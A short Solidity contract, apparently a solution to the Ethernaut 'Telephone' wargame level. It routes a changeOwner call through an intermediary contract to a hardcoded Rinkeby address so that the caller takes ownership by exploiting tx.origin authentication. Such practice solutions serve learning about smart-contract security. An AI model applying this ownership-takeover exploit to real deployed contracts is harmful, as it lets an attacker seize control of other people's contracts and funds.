// SPDX-License-Identifier: Apache
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// Declare interface for ringing Telephone
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Tele {
    // Actual address of Telephone on rinkeby
    address public _ITelephoneLocation = 0x1b809cC0454e7c8d7C9a87600dae7F87EbFe912e;
    function TeleCaller() external payable {
        address _desiredOwner = msg.sender;
        console.log("The Owner Given to tele is: %s", _desiredOwner);
        // Call Telephone
        ITelephone(_ITelephoneLocation).changeOwner(_desiredOwner);
    }
}